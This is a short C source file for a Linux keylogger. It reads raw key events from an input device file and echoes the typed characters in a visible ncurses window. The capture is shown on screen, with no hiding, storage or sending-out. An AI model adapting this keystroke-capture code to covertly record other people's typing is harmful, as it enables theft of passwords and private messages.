# include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>
#include <linux/input-event-codes.h>
#include <ncurses.h>
#include <string.h>
void draw_boundary(){
  box(stdscr, 0, 0);
}

typedef struct {
  char wrds[4096];
  size_t len;
}storage_t;
storage_t buf = { .len=0};

int main(int argc, char *argv[]){
  initscr();
  draw_boundary();
  start_color();
  init_pair (1, COLOR_WHITE,COLOR_BLUE);
  wbkgd(stdscr, COLOR_PAIR(1));
      
  refresh();
      
  if(argc!=2){
    printw("usage : %s <event-file>\n", argv[0]);
    exit(-1);
    refresh();
  }
  printw("keylogger active\n");
  refresh();
  int fd = open(argv[1], O_RDONLY, 0);
  struct input_event ie;
  while(1){
    read(fd , &ie, sizeof(ie));
    if(ie.type != EV_KEY)
    continue;
  if(ie.value !=1)
    continue;
  if(ie.code >=2 && ie.code <= 10){
    printw("%d", ie.code -1);
  }
  else if(ie.code == 11){
   printw("%d", ie.code-1);
  }
  if(ie.code == KEY_BACKSPACE){
    if(buf.len > 0){
      buf.len--;
      buf.wrds[buf.len] = '\0';
      printw("\b \b");
      fflush(stdout);
}
}

  refresh();
  if(ie.code == KEY_A){
    if(buf.len < 4096){
      buf.wrds[buf.len++] ='A';
      printw( "A");
      fflush(stdout);
    }
  }
  if(ie.code==KEY_RESERVED){
    printw("%d", ie.code);
  }

  if(ie.code == KEY_B){
    printw("B");
  }
  if(ie.code==KEY_C){
   printw("C");
  }
  if(ie.code==KEY_D){
    printw("D");
  }
  if(ie.code==KEY_E){
    printw("E");
  }
  if(ie.code==KEY_G){
    printw("G");
  }
 if(ie.code==KEY_H){
  printw("H");
 } 
 if(ie.code==KEY_I){
  printw("I");
 }
 if(ie.code==KEY_J){
  printw("J");
 } 
if(ie.code==KEY_K){
 printw("K");
}
if(ie.code==KEY_L){
  printw("L");
}
if(ie.code==KEY_M){
  printw("M");
}
if(ie.code==KEY_N){
  printw("N");
}
if(ie.code==KEY_O){
  printw("O");
}
if(ie.code == 33){
  printw("F");
}
if(ie.code == KEY_P){
  printw("P");
}
if(ie.code==KEY_Q){
  printw("Q");
}
if(ie.code==KEY_R){
  printw("R");
}
if(ie.code==KEY_S){
 printw("S");
}
if(ie.code==KEY_T){
  printw("T");
}
if(ie.code==KEY_U){
  printw("U");
}
if(ie.code==KEY_V){
  printw("V");
}
if(ie.code==KEY_W){
  printw("W");
}
if(ie.code==KEY_X){
  printw("X");
}
if(ie.code==KEY_Y){
printw("Y");
}
if(ie.code==KEY_Z){
  printw("Z");
}
if(ie.code == 12){
  printw(" - ");
}
if(ie.code == 13){
  printw("=");
}
//if(ie.code == 15){
  //printw(" ");
//}
if(ie.code == 28){
  printw("<enter>");
}
if(ie.code == 39){
  printw(";");
}
if(ie.code ==40){
  printw(" ' ");
}
if(ie.code == 43){
  printw("\\");
}
if(ie.code == 51){
  printw(",");
}
if(ie.code == 52){
  printw(".");
}
if(ie.code == 53){
  printw("/");
}
if(ie.code == 57){
  printw(" ");
}
refresh();    
  fflush(stdout);
  }  
  return 0;
}

